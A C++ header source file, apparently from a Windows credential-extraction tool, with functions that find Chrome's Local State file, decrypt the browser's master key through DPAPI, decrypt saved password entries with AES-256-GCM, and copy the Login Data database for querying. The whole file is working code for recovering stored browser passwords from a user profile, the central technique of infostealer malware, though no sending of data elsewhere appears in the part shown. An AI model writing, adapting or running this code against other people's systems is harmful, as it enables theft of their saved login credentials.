#pragma once

#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <regex>
#include <vector>
#include <string>
#include <sqlite3.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#include "../include/json.hpp" 

namespace fs = std::filesystem;
using json = nlohmann::json;

// Get the full path to the Chrome Local State file.
std::string getChromiumLocalStatePath() {
    char* userProfile = getenv("USERPROFILE");
    if (!userProfile) {
        std::cerr << "USERPROFILE not set" << std::endl;
        return "";
    }
    fs::path localStatePath = fs::path(userProfile) / "AppData/Local/Google/Chrome/User Data/Local State";
    return localStatePath.string();
}

// Get the full path to the Chrome User Data folder.
std::string getChromiumUserDataPath() {
    char* userProfile = getenv("USERPROFILE");
    if (!userProfile) {
        std::cerr << "USERPROFILE not set" << std::endl;
        return "";
    }
    fs::path chromePath = fs::path(userProfile) / "AppData/Local/Google/Chrome/User Data";
    return chromePath.string();
}

std::vector<unsigned char> base64_decode(const std::string &in) {
    BIO *bio, *b64;
    int in_len = in.size();
    std::vector<unsigned char> out(in_len);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new_mem_buf(in.data(), in_len);
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    int decoded_length = BIO_read(bio, out.data(), in_len);
    out.resize(decoded_length);
    BIO_free_all(bio);
    return out;
}

// Function to get the secret key from the Chrome Local State file.
std::vector<unsigned char> getSecretKey() {
    std::string localStatePath = getChromiumLocalStatePath();
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        std::cerr << "Couldn't access localState file" << std::endl;
        return {};
    }
    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();

    json localState;
    try {
        localState = json::parse(buffer.str());
    }
    catch (json::parse_error& e) {
        std::cerr << "JSON parse error: " << e.what() << std::endl;
        return {};
    }

    std::string encrypted_key_b64 = localState["os_crypt"]["encrypted_key"];
    // Decode from base64.
    std::vector<unsigned char> encrypted_key = base64_decode(encrypted_key_b64);
    // Remove the "DPAPI" prefix (first 5 bytes)
    if (encrypted_key.size() <= 5) {
        std::cerr << "Encrypted key too short" << std::endl;
        return {};
    }
    encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 5);

    // Use Windows DPAPI to decrypt the key.
    DATA_BLOB inBlob;
    inBlob.pbData = encrypted_key.data();
    inBlob.cbData = static_cast<DWORD>(encrypted_key.size());
    DATA_BLOB outBlob;
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        std::cerr << "CryptUnprotectData failed" << std::endl;
        return {};
    }

    std::vector<unsigned char> secret_key(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return secret_key;
}


std::string aesGcmDecrypt(const std::vector<unsigned char>& ciphertext, const std::vector<unsigned char>& key) {
    if (ciphertext.size() < 31) { 
        return "";
    }

    const int iv_len = 12;
    const int tag_len = 16;

    const unsigned char* iv = ciphertext.data() + 3; // skip first 3 bytes (version info)
    size_t encrypted_len = ciphertext.size() - 3 - iv_len - tag_len;
    const unsigned char* encrypted_password = ciphertext.data() + 3 + iv_len;
    const unsigned char* tag = ciphertext.data() + ciphertext.size() - tag_len;

    std::vector<unsigned char> outbuf(encrypted_len);
    int len = 0;
    int ret = -1;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
        return "";

    // Initialize decryption context with AES-256-GCM.
    ret = EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
    if(ret != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    // Set IV length if default 12 bytes is not appropriate.
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, nullptr);

    // Initialize key and IV.
    ret = EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv);
    if(ret != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    int plaintext_len = 0;
    // Provide the message to be decrypted.
    ret = EVP_DecryptUpdate(ctx, outbuf.data(), &len, encrypted_password, (int)encrypted_len);
    if(ret != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    plaintext_len = len;

    // Set expected tag value.
    ret = EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag_len, (void*)tag);
    if(ret != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    // Finalize decryption.
    ret = EVP_DecryptFinal_ex(ctx, outbuf.data() + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    if(ret != 1) {
        // Decryption failed
        return "";
    }
    plaintext_len += len;
    std::string decrypted(reinterpret_cast<char*>(outbuf.data()), plaintext_len);
    return decrypted;
}

// Function to copy the Chrome login database to a temporary file and open a connection.
sqlite3* getDBConnection(const fs::path &loginDataPath, const std::string& dbfilepath) {
    try {
        fs::path tempDBpath = dbfilepath;
        fs::copy_file(loginDataPath, tempDBpath, fs::copy_options::overwrite_existing);
        sqlite3* db = nullptr;
        if (sqlite3_open(tempDBpath.string().c_str(), &db) != SQLITE_OK) {
            std::cerr << "Couldn't open sqlite database file" << std::endl;
            return nullptr;
        }
        return db;
    }
    catch (std::exception &e) {
        std::cerr << "error: " << e.what() << std::endl;
        return nullptr;
    }
}
